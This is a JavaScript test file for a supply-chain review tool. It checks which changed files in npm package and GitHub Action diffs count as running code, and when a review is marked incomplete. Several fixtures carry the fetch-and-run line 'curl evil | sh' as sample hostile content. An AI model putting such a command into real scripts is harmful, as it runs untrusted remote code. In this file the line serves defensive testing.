// Tests for diff budgeting: what counts as code that runs, and when a diff is "not fully reviewed".
import { test, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { splitGitDiff, fitDiff, reviewNpmDiff, classifyPackageFiles, parseActionRuns, reviewAction } from '../collect-context.mjs';
import { inspectPackageFiles } from '../collect-context.mjs';

const fileDiff = (path, body, extra = '') => `diff --git a/${path} b/${path}\n${extra}index v1..v2 100644\n--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n${body}`;
const files = obj => Object.entries(obj).map(([name, body]) => ({ name: `package/${name}`, body: Buffer.from(body) }));

test('splitGitDiff splits per file and spots deleted and binary files', () => {
  const chunks = splitGitDiff([
    fileDiff('index.js', '-a\n+b'),
    'diff --git a/old.js b/old.js\ndeleted file mode 100644\n--- a/old.js\n+++ /dev/null\n@@ -1 +0,0 @@\n-x',
    'diff --git a/img.png b/img.png\nBinary files a/img.png and b/img.png differ',
  ].join('\n'));
  assert.deepEqual(chunks.map(c => [c.path, c.deleted, c.binary]), [['index.js', false, false], ['old.js', true, false], ['img.png', false, true]]);
});

test('fitDiff requires all running code, shows context if there is room, lists the rest', () => {
  const chunks = splitGitDiff([fileDiff('index.js', '+RUNS()'), fileDiff('src/a.ts', '+SOURCE()'), fileDiff('README.md', '+docs')].join('\n'));
  const opts = { required: p => p === 'index.js', context: p => p.startsWith('src/') };
  let r = fitDiff(chunks, { ...opts, budget: 10_000 });
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('+RUNS()') && r.text.includes('+SOURCE()') && !r.text.includes('+docs'));
  assert.match(r.text, /not run when the package is used: README\.md/);
  r = fitDiff(chunks, { ...opts, budget: 50 });
  assert.equal(r.complete, false, 'running code over the budget is not fully reviewed');
  assert.match(r.text, /over the review budget: index\.js/);
  r = fitDiff(chunks, { ...opts, budget: fileDiff('index.js', '+RUNS()').length + 5 });
  assert.equal(r.complete, true, 'context that does not fit does not matter');
  assert.match(r.text, /no room: src\/a\.ts/);
  r = fitDiff([{ path: 'addon.node', text: '', binary: true }], { required: () => true, budget: 1e6 });
  assert.equal(r.complete, false, 'a binary change to running code cannot be reviewed');
  r = fitDiff([{ path: 'gone.js', text: '', deleted: true }], { required: () => true, budget: 1e6 });
  assert.equal(r.complete, true, 'a deleted file cannot run');
});

test('classifyPackageFiles: tests and docs are code only when code refers to them', () => {
  const cls = classifyPackageFiles(files({
    'package.json': '{"main":"index.js"}',
    'index.js': "module.exports = require('./lib/loader'); // see data.txt",
    'lib/loader.js': "require('fs').readFileSync(__dirname + '/../data.txt')",
    'data.txt': 'PAYLOAD',
    'README.md': 'docs',
    'test/index.test.js': 'test()',
    '__tests__/x.js': 'x()',
    'logo.png': 'png',
  }));
  assert.ok(cls.codeSet.has('index.js') && cls.codeSet.has('lib/loader.js'));
  assert.ok(cls.codeSet.has('data.txt'), 'unchanged code that mentions data.txt makes it code');
  assert.ok(!cls.codeSet.has('README.md') && !cls.codeSet.has('test/index.test.js') && !cls.codeSet.has('__tests__/x.js') && !cls.codeSet.has('logo.png'));
});

test('reviewNpmDiff only budgets code that runs in the new version', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': 'x', 'README.md': 'docs', 'index.d.ts': 't' }), unsupported: [] };
  const diff = [fileDiff('index.js', '+CODE()'), fileDiff('README.md', `+${'d'.repeat(5000)}`), fileDiff('index.d.ts', `+${'t'.repeat(5000)}`), fileDiff('package.json', '+"version": "2"')].join('\n');
  let r = reviewNpmDiff(diff, newFiles, 500);
  assert.equal(r.complete, true, 'big doc and type-declaration changes do not use the budget');
  assert.ok(r.text.includes('+CODE()') && r.text.includes('"version": "2"'));
  r = reviewNpmDiff(diff, null, 500);
  assert.equal(r.complete, false, 'without the tarball every text file counts, so this no longer fits');
  assert.equal(r.classified, false);
  r = reviewNpmDiff(diff, { ...newFiles, unsupported: ['x (type L)'] }, 500);
  assert.equal(r.classified, false, 'a tarball the reader cannot fully read is not used to classify');
});

test('parseActionRuns reads the runs: block', () => {
  assert.deepEqual(parseActionRuns("name: x\nruns:\n  using: 'node20'\n  main: 'dist/index.js'\n  post: dist/post.js # cleanup\n  post-if: success()\nbranding:\n  icon: x\n"),
    { using: 'node20', main: 'dist/index.js', post: 'dist/post.js' });
  assert.deepEqual(parseActionRuns('runs:\n  using: composite\n  steps:\n    - run: ./x.sh\n      shell: bash\n'), { using: 'composite' });
  assert.deepEqual(parseActionRuns("runs:\n  using: docker\n  image: 'Dockerfile'\n"), { using: 'docker', image: 'Dockerfile' });
});

// ---- reviewAction against a mocked GitHub API ----
const realFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = realFetch; });

// The repo at each ref is the `contents` keys for that ref plus the compare's changed files.
function mockGitHub({ compare, contents, tree = 'ok' }) {
  globalThis.fetch = async url => {
    const u = new URL(url);
    if (u.pathname.includes('/compare/')) return compare === null ? new Response('{}', { status: 404 }) : Response.json(compare);
    const t = u.pathname.match(/\/git\/trees\/(.+)$/);
    if (t) {
      if (tree === 'fail') return new Response('{}', { status: 500 });
      const ref = decodeURIComponent(t[1]);
      const paths = new Set([...Object.keys(contents).filter(k => k.endsWith(`@${ref}`)).map(k => k.slice(0, k.lastIndexOf('@'))), ...(compare?.files ?? []).filter(f => f.status !== 'removed').map(f => f.filename)]);
      return Response.json({ tree: [...paths].map(path => ({ path, type: 'blob' })), truncated: tree === 'truncated' });
    }
    const m = u.pathname.match(/\/contents\/(.+)$/);
    const body = m && contents[`${decodeURIComponent(m[1])}@${u.searchParams.get('ref')}`];
    return body == null ? new Response('', { status: 404 }) : new Response(body);
  };
}
const NODE_YML = 'runs:\n  using: node20\n  main: dist/index.js\n';
const change = { action: 'acme/act', from: { ref: 'v1', tag: 'v1' }, to: { ref: 'v2', tag: 'v2' } };
const compareFiles = (...f) => ({ total_commits: 2, files: f });

test('reviewAction diffs the bundle itself when the compare has no patch for it', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 },
      { filename: 'src/main.ts', status: 'modified', patch: '@@ -1 +1 @@\n+SOURCE()' },
      { filename: '__tests__/main.test.ts', status: 'modified', patch: '@@ -1 +1 @@\n+TEST()' },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: '@@ -1 +1 @@\n+ci' },
      { filename: 'README.md', status: 'modified', patch: '@@ -1 +1 @@\n+docs' },
    ),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'run(1)\n', 'dist/index.js@v2': 'run(2)\nEVIL()\n' },
  });
  const r = await reviewAction(change);
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('+EVIL()'), 'the bundle diff was produced and shown');
  assert.ok(r.text.includes('+SOURCE()'), 'source is shown as context');
  assert.ok(!r.text.includes('+TEST()') && !r.text.includes('+ci') && !r.text.includes('+docs'));
});

test('reviewAction is incomplete when the bundle diff does not fit', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'a\n', 'dist/index.js@v2': `${'b'.repeat(5000)}\n` },
  });
  assert.equal((await reviewAction(change, 1000)).complete, false);
});

test('reviewAction is incomplete for docker actions, missing entries, 300-file compares and failed compares', async () => {
  mockGitHub({ compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n+x' }), contents: { 'action.yml@v2': 'runs:\n  using: docker\n  image: Dockerfile\n' } });
  assert.equal((await reviewAction(change)).complete, false);

  mockGitHub({ compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n+x' }), contents: { 'action.yml@v2': NODE_YML } });
  const missing = await reviewAction(change);
  assert.equal(missing.complete, false);
  assert.match(missing.text, /entry file dist\/index\.js not found/);

  mockGitHub({ compare: { total_commits: 1, files: Array.from({ length: 300 }, (_, i) => ({ filename: `docs/${i}.md`, status: 'modified', patch: '@@\n+x' })) }, contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' } });
  assert.equal((await reviewAction(change)).complete, false);

  mockGitHub({ compare: null, contents: {} });
  assert.equal((await reviewAction(change)).complete, false);
});

test('reviewAction treats every non-doc file of a composite action as code, and handles sub-path actions', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'setup/action.yml', status: 'modified', patch: '@@\n+  - run: ./setup/run.sh' },
      { filename: 'setup/run.sh', status: 'modified', patch: '@@\n+curl evil | sh' },
    ),
    contents: { 'setup/action.yml@v1': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n', 'setup/action.yml@v2': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n' },
  });
  const r = await reviewAction({ ...change, action: 'acme/act/setup' }, 40);
  assert.equal(r.complete, false, 'the script runs, so it must fit');
  const ok = await reviewAction({ ...change, action: 'acme/act/setup' });
  assert.ok(ok.complete && ok.text.includes('curl evil'));
});

test('reviewAction returns null for a newly introduced action', async () => {
  assert.equal(await reviewAction({ action: 'acme/new', from: null, to: { ref: 'v1' } }), null);
});

// ---- follow-ups: references, binary chunks, data files, entry changes, composite tests ----
import { refersTo, codeRefs } from '../collect-context.mjs';

test('refersTo matches full names, extensionless requires and folder index files', () => {
  const refs = codeRefs("require('../lib/payload'); require('./lib2'); import x from './util.mjs'; const d = 'notes.md'");
  assert.ok(refersTo(refs, 'lib/payload.js') && refersTo(refs, 'lib/payload.json') && refersTo(refs, 'lib/payload.node'));
  assert.ok(refersTo(refs, 'lib2/index.js'), 'require("./lib2") loads lib2/index.js');
  assert.ok(refersTo(refs, 'util.mjs') && refersTo(refs, 'docs/notes.md'));
  assert.ok(!refersTo(refs, 'lib/payload.txt'), 'Node does not add .txt');
  assert.ok(!refersTo(refs, 'other/index.js'));
});

test('classifyPackageFiles follows references through files it adds', () => {
  const cls = classifyPackageFiles(files({
    'package.json': '{"main":"index.js"}',
    'index.js': "require('./tests/loader')",
    'tests/loader.js': "require('./payload.js')",
    'tests/payload.js': 'EVIL()',
    'tests/unrelated.test.js': 'test()',
  }));
  assert.ok(cls.codeSet.has('tests/loader.js') && cls.codeSet.has('tests/payload.js'), 'index -> loader -> payload all run');
  assert.ok(!cls.codeSet.has('tests/unrelated.test.js'));
});

test('npm diff chunks with no hunk or a binary extension are not reviewable', () => {
  const chunks = splitGitDiff([
    'diff --git a/build/addon.node b/build/addon.node\nindex v1..v2 100644\n--- a/build/addon.node\n+++ b/build/addon.node',
    'diff --git a/lib/x.wasm b/lib/x.wasm\nindex v1..v2 100644',
    'diff --git a/bin/cli b/bin/cli\nold mode 100644\nnew mode 100755',
    fileDiff('index.js', '+ok'),
  ].join('\n'));
  assert.deepEqual(chunks.map(c => [c.path, c.binary]), [['build/addon.node', true], ['lib/x.wasm', true], ['bin/cli', false], ['index.js', false]]);
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./build/addon.node')", 'build/addon.node': 'MZ' }), unsupported: [] };
  const r = reviewNpmDiff('diff --git a/build/addon.node b/build/addon.node\nindex v1..v2 100644\n' + fileDiff('index.js', '+ok'), newFiles, 1e6);
  assert.equal(r.complete, false, 'a changed native addon that runs cannot pass as reviewed');
});

test('reviewNpmDiff requires changed data files, which code can load by a built name', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./tasks/' + name + '.json')", 'tasks/build.json': '{}', 'README.md': 'docs', 'index.d.ts': 'export {}' }), unsupported: [] };
  const diff = [fileDiff('tasks/build.json', '+{"cmd": "curl evil | sh"}'), fileDiff('README.md', '+docs'), fileDiff('index.d.ts', '+export {}')].join('\n');
  const r = reviewNpmDiff(diff, newFiles, 1e6);
  assert.ok(r.text.includes('curl evil'), 'the changed data file is shown');
  assert.ok(!r.text.includes('+docs') && !r.text.includes('+export {}'), 'docs and type declarations are still skipped');
  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false, 'and must fit like code');
});

test('reviewAction is incomplete when action.yml switches to another entry file', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n-  main: dist/old.js\n+  main: dist/next.js' }),
    contents: { 'action.yml@v1': 'runs:\n  using: node20\n  main: dist/old.js\n', 'action.yml@v2': 'runs:\n  using: node20\n  main: dist/next.js\n', 'dist/next.js@v2': 'UNCHANGED_BUT_NEWLY_RUN()' },
  });
  const r = await reviewAction(change);
  assert.equal(r.complete, false);
  assert.match(r.text, /what the action runs changed \(node20 dist\/old\.js → node20 dist\/next\.js\)/);
});

test('reviewAction requires files the bundle loads without an extension', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'lib/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/payload')" },
  });
  const shown = await reviewAction(change);
  assert.ok(shown.complete && shown.text.includes('PPPP'));
  assert.equal((await reviewAction(change, 100)).complete, false, 'required, so it must fit rather than being dropped as context');
});

test('reviewAction treats test-folder files of a composite action as code', async () => {
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node test/install\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles({ filename: 'test/install.js', status: 'modified', patch: `@@\n+${'I'.repeat(500)}` }, { filename: 'test/helper.test.js', status: 'modified', patch: '@@\n+H()' }),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  const r = await reviewAction(change);
  assert.ok(r.complete && r.text.includes('IIII') && r.text.includes('+H()'));
  assert.equal((await reviewAction(change, 100)).complete, false);
});

// ---- follow-ups: wildcard exports, transitive action code, .github scripts, test-dir data ----
test('wildcard and folder exports make every matching file an entry point', () => {
  const cls = classifyPackageFiles(files({
    'package.json': JSON.stringify({ exports: { './*': './tests/*.js', './legacy/': './old/' } }),
    'tests/feature.js': 'EVIL()',
    'tests/notes.md': 'docs',
    'old/a.js': 'A()',
    'logo.png': 'png',
  }));
  assert.ok(cls.codeSet.has('tests/feature.js'), "require('pkg/feature') loads tests/feature.js");
  assert.ok(cls.codeSet.has('old/a.js'), 'folder mappings expose everything under them');
  assert.ok(!cls.codeSet.has('tests/notes.md') && !cls.codeSet.has('logo.png'));
  const r = reviewNpmDiff(fileDiff('tests/feature.js', '+EVIL()'), { files: files({ 'package.json': JSON.stringify({ exports: { './*': './tests/*.js' } }), 'tests/feature.js': 'x' }), unsupported: [] }, 20);
  assert.equal(r.complete, false, 'a changed file behind a wildcard export is required code');
});

test('reviewNpmDiff requires changed data files even under test folders or with doc-like names', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./test/' + n + '.json')", 'test/build.json': '{}', 'README.json': '{}' }), unsupported: [] };
  const diff = [fileDiff('test/build.json', '+{"cmd":"curl evil | sh"}'), fileDiff('README.json', '+{"x":"EVIL"}')].join('\n');
  const r = reviewNpmDiff(diff, newFiles, 1e6);
  assert.ok(r.text.includes('curl evil') && r.text.includes('EVIL'));
  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false);
});

test('reviewAction requires changed JavaScript reached through an unchanged file outside dist/', async () => {
  mockGitHub({
    // dist/index.js loads ../lib/loader.js (unchanged, so not in the compare), which loads ./payload.js.
    compare: compareFiles({ filename: 'lib/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'an oversized changed payload is not silently dropped');
  const r = await reviewAction(change);
  assert.ok(r.complete && r.text.includes('PPPP'));
});

test('reviewAction keeps TypeScript source, TS tests and workflow YAML of node actions as context only', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'src/main.ts', status: 'modified', patch: `@@\n+${'S'.repeat(500)}` },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: `@@\n+${'R'.repeat(500)}` },
      { filename: '__tests__/a.test.ts', status: 'modified', patch: `@@\n+${'T'.repeat(500)}` },
    ),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' },
  });
  assert.equal((await reviewAction(change, 100)).complete, true);
});

test("reviewAction treats a composite action's .github/ scripts as code, but not its workflows", async () => {
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node .github/scripts/test/install\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles(
      { filename: '.github/scripts/test/helper.js', status: 'modified', patch: `@@\n+${'H'.repeat(500)}` },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: `@@\n+${'W'.repeat(500)}` },
    ),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'the helper the script loads is required');
  const r = await reviewAction(change, 1e6);
  assert.ok(r.text.includes('HHHH'));
  assert.match(r.text, /not run when the package is used: \.github\/workflows\/ci\.yml/);
});

test('reviewAction requires changed JavaScript under test folders, which an unchanged file can load', async () => {
  mockGitHub({
    // dist/index.js -> lib/loader.js (unchanged) -> test/payload.js (changed)
    compare: compareFiles({ filename: 'test/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, false);
});

test('a sourceMappingURL comment does not make the source map required, but a real require does', async () => {
  const map = { filename: 'dist/index.js.map', status: 'modified', patch: `@@\n+${'M'.repeat(500)}` };
  mockGitHub({ compare: compareFiles(map), contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'run()\n//# sourceMappingURL=index.js.map' } });
  assert.equal((await reviewAction(change, 100)).complete, true);
  mockGitHub({ compare: compareFiles(map), contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('./index.js.map')" } });
  assert.equal((await reviewAction(change, 100)).complete, false);
});

// ---- follow-ups: any file type in npm diffs, JavaScript anywhere in actions ----
test('reviewNpmDiff requires every changed file except docs, types, maps, styles, markup and assets', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': 'x', 'test/build.dat': 'd', 'LICENSE.txt': 'MIT', 'README.json': '{}' }), unsupported: [] };
  const diff = [fileDiff('test/build.dat', '+EVIL_DAT'), fileDiff('README.json', '+EVIL_JSON'), fileDiff('LICENSE.txt', '+MIT'), fileDiff('logo.png', '+png')].join('\n');
  const r = reviewNpmDiff(diff, newFiles, 1e6);
  assert.ok(r.text.includes('EVIL_DAT') && r.text.includes('EVIL_JSON'), 'unknown data formats and doc-named data files are required');
  assert.ok(!r.text.includes('+MIT'), 'a licence text file is still docs');
  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false);
});

test('reviewAction requires changed JavaScript under .github/, for node and composite actions', async () => {
  mockGitHub({
    compare: compareFiles({ filename: '.github/scripts/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'node: reached through an unchanged loader');
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node .github/workflows/install.js\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles({ filename: '.github/workflows/helper.js', status: 'modified', patch: `@@\n+${'H'.repeat(500)}` }),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'composite: a helper the run: script loads');
});

test('known limit: an action data file loaded through an unchanged file by a built name is context', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'data/payload.json', status: 'modified', patch: `@@\n+${'D'.repeat(500)}` }),
    contents: {
      'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML,
      'dist/index.js@v2': "require('../lib/loader.js')",
      'lib/loader.js@v2': "require('../' + dir + '/' + name + '.json')",
    },
  });
  assert.equal((await reviewAction(change, 100)).complete, true, 'documented in the README; requiring all data would block nearly every action update');
});

test('reviewAction follows literal references through unchanged files, whatever the extension', async () => {
  // dist/index.js -> lib/loader.js (unchanged) -> .github/scripts/payload.txt (changed, run as CommonJS)
  const contents = {
    'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML,
    'dist/index.js@v2': "require('../lib/loader.js')",
    'lib/loader.js@v2': "require('../.github/scripts/payload.txt')",
  };
  mockGitHub({ compare: compareFiles({ filename: '.github/scripts/payload.txt', status: 'modified', patch: `@@\n+${'T'.repeat(500)}` }), contents });
  const r = await reviewAction(change, 100);
  assert.equal(r.complete, false, 'the payload is reached, so it is required');
  assert.match(r.text, /referenced files followed: 2/, 'loader.js and payload.txt were read');

  contents['lib/loader.js@v2'] = "module.exports = require('../data/payload.json')";
  mockGitHub({ compare: compareFiles({ filename: 'data/payload.json', status: 'modified', patch: `@@\n+${'D'.repeat(500)}` }), contents });
  assert.equal((await reviewAction(change, 100)).complete, false, 'a data file named literally in an unchanged loader is required');
});

test('reviewAction fails closed when it cannot follow references', async () => {
  const base = { compare: compareFiles({ filename: 'README.md', status: 'modified', patch: '@@\n+docs' }), contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' } };
  mockGitHub({ ...base, tree: 'fail' });
  assert.match((await reviewAction(change)).text, /could not list the repository's files/);
  mockGitHub({ ...base, tree: 'fail' });
  assert.equal((await reviewAction(change)).complete, false);
  mockGitHub({ ...base, tree: 'truncated' });
  assert.equal((await reviewAction(change)).complete, false);

  // An entry that names more files than the read limit.
  const many = Object.fromEntries(Array.from({ length: 401 }, (_, i) => [`lib/f${i}.js@v2`, 'x']));
  mockGitHub({ compare: base.compare, contents: { ...base.contents, ...many, 'dist/index.js@v2': Array.from({ length: 401 }, (_, i) => `require('../lib/f${i}.js')`).join('\n') } });
  const r = await reviewAction(change);
  assert.equal(r.complete, false);
  assert.match(r.text, /reaches more than 400 files/);
});

test('a composite action requires shell helpers under .github/workflows/, but not the workflow YAML', async () => {
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: bash .github/workflows/install.sh\n      shell: bash\n';
  mockGitHub({
    // install.sh sources helper.sh, which action.yml never names.
    compare: compareFiles(
      { filename: '.github/workflows/helper.sh', status: 'modified', patch: `@@\n+${'S'.repeat(500)}` },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: `@@\n+${'W'.repeat(500)}` },
    ),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'the sourced helper is required');
  const r = await reviewAction(change, 1e6);
  assert.ok(r.text.includes('SSSS'));
  assert.match(r.text, /not run when the package is used: \.github\/workflows\/ci\.yml/);
});

test('a node action requires changed scripts anywhere, since the bundle can execute them', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'scripts/post.sh', status: 'modified', patch: `@@\n+${'X'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' },
  });
  assert.equal((await reviewAction(change, 100)).complete, false);
});

test('reviewAction follows a folder require through its unchanged package.json', async () => {
  // dist/index.js -> require('../lib/loader') -> lib/loader/package.json (unchanged) -> main
  const base = { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader')" };
  mockGitHub({
    compare: compareFiles({ filename: '.github/scripts/payload.txt', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { ...base, 'lib/loader/package.json@v2': '{"main": "../../.github/scripts/payload.txt"}' },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'a main with an unusual extension is reached');
  mockGitHub({
    compare: compareFiles({ filename: 'lib/loader/payload.dat', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { ...base, 'lib/loader/package.json@v2': '{"main": "payload.dat"}' },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'a bare main without "./" is reached too');
});

// ---- follow-ups: imports maps, byte-order marks, linear-time path scan ----
import { manifestTargets } from '../collect-context.mjs';

test('package.json "imports" targets are entry points; bare package mappings are not files', () => {
  const cls = classifyPackageFiles(files({
    'package.json': JSON.stringify({ main: 'index.js', imports: { '#p': './tests/payload.js', '#t': { node: './data/run.txt' }, '#dep': 'some-package' } }),
    'index.js': "require('#p'); require('#t')",
    'tests/payload.js': 'EVIL()',
    'data/run.txt': 'EVIL_TXT()',
  }));
  assert.ok(cls.codeSet.has('tests/payload.js') && cls.codeSet.has('data/run.txt'));
  assert.equal(cls.missing.length, 0, 'the bare "some-package" mapping is not treated as a missing file');
  assert.match(manifestTargets(JSON.stringify({ imports: { '#p': './x/payload.txt', '#dep': 'pkg' } })), /^\.\/x\/payload\.txt$/m);
});

test('a package.json with a UTF-8 byte-order mark still declares its entry points', () => {
  const bom = '﻿' + JSON.stringify({ main: './README.md' });
  const cls = classifyPackageFiles(files({ 'package.json': bom, 'README.md': 'EVIL_MD()' }));
  assert.ok(cls.codeSet.has('README.md'), 'the .md main is code');
  assert.equal(manifestTargets(bom), './README.md');
  const nested = classifyPackageFiles(files({ 'package.json': '{}', 'lib/package.json': '﻿{"main":"x.txt"}', 'lib/x.txt': 'X()' }));
  assert.ok(nested.codeSet.has('lib/x.txt'), 'nested manifests too');
});

test('scanning for path segments stays fast on long text without slashes', () => {
  const start = Date.now();
  const refs = codeRefs('a'.repeat(300_000) + ' ' + "require('./lib/a/b')");
  assert.ok(Date.now() - start < 1000, `took ${Date.now() - start}ms`);
  assert.ok(refs.tails.has('a') && refs.tails.has('b') && refs.tails.has('lib'));
});

test('a pattern that names an asset extension makes those assets code; a generic one does not', () => {
  const cls = classifyPackageFiles(files({
    'package.json': JSON.stringify({ imports: { '#p/*': './assets/*.png' }, exports: { './*': './*' } }),
    'assets/payload.png': 'EVIL_AS_JS()',
    'logo.png': 'png',
  }));
  assert.ok(cls.codeSet.has('assets/payload.png'), "require('#p/payload') runs assets/payload.png as JavaScript");
  assert.ok(!cls.codeSet.has('logo.png'), '"./*" still skips images');
});

test('"types" conditions in imports and exports are not runtime entry points', () => {
  const pkg = JSON.stringify({ main: 'index.js', imports: { '#internal': { types: './types/internal.d.ts', default: './lib/internal.js' } } });
  const r = inspectPackageFiles(files({ 'package.json': pkg, 'index.js': "require('#internal')", 'lib/internal.js': 'I()', 'types/internal.d.ts': 'x'.repeat(30_000) }));
  assert.equal(r.inspected, true, 'a large declaration file does not use the code budget');
  assert.ok(r.text.includes('I()'), 'the default target is still code');
  assert.equal(manifestTargets(JSON.stringify({ exports: { '.': { types: './a.d.ts', default: './a.js' } } })), './a.js');
});

test('a nested manifest\'s "types" field does not pull its declaration file into the code', async () => {
  const r = inspectPackageFiles(files({
    'package.json': '{"main":"index.js"}',
    'index.js': "require('./lib')",
    'lib/package.json': JSON.stringify({ main: 'main.js', types: './types/internal.d.ts' }),
    'lib/main.js': 'M()',
    'lib/types/internal.d.ts': 'x'.repeat(30_000),
  }));
  assert.equal(r.inspected, true, 'a large declaration file does not use the code budget');
  assert.ok(r.text.includes('M()'), 'the nested main is still code');

  // The action review reads package.json files the same way.
  mockGitHub({
    compare: compareFiles({ filename: 'lib/loader/types/internal.d.ts', status: 'modified', patch: `@@\n+${'T'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader')", 'lib/loader/package.json@v2': JSON.stringify({ main: 'main.js', types: './types/internal.d.ts' }) },
  });
  assert.equal((await reviewAction(change, 100)).complete, true, 'the .d.ts named only by "types" stays context');
});

test('files a package.json script runs are code, for packages and actions', async () => {
  // index.js runs `npm --prefix lib run check`, and lib/package.json's script runs a .md file.
  const pkg = big => files({
    'package.json': '{"main":"index.js"}',
    'index.js': "require('child_process').execSync('npm --prefix lib run check')",
    'lib/package.json': JSON.stringify({ scripts: { check: 'bash ../docs/payload.md' }, types: './types.d.ts' }),
    'docs/payload.md': big ? 'x'.repeat(30_000) : 'EVIL_SH',
    'lib/types.d.ts': 'x'.repeat(30_000),
  });
  assert.ok(classifyPackageFiles(pkg(false)).codeSet.has('docs/payload.md'), 'the script names the .md file');
  assert.equal(inspectPackageFiles(pkg(true)).inspected, false, 'a script payload over the budget is not inspected');
  assert.equal(inspectPackageFiles(pkg(false)).inspected, true, '"types" still stays out of the code');
  assert.match(manifestTargets(JSON.stringify({ scripts: { check: 'bash ../docs/payload.md' } })), /bash \.\.\/docs\/payload\.md/);

  const yml = 'runs:\n  using: composite\n  steps:\n    - run: npm --prefix ./tools run check\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles({ filename: 'docs/payload.md', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml, 'tools/package.json@v2': JSON.stringify({ scripts: { check: 'bash ../docs/payload.md' } }) },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'the changed .md the script runs is required');
  assert.ok((await reviewAction(change, 1e6)).text.includes('PPPP'));
});

test("files the root package.json's scripts run are code, for packages and actions", async () => {
  // index.js runs `npm run check` from the package root; the root script runs a .md file.
  const pkg = big => files({
    'package.json': JSON.stringify({ main: 'index.js', scripts: { check: 'bash docs/payload.md' } }),
    'index.js': "require('child_process').execSync('npm run check', { cwd: __dirname })",
    'docs/payload.md': big ? 'x'.repeat(30_000) : 'EVIL_SH',
  });
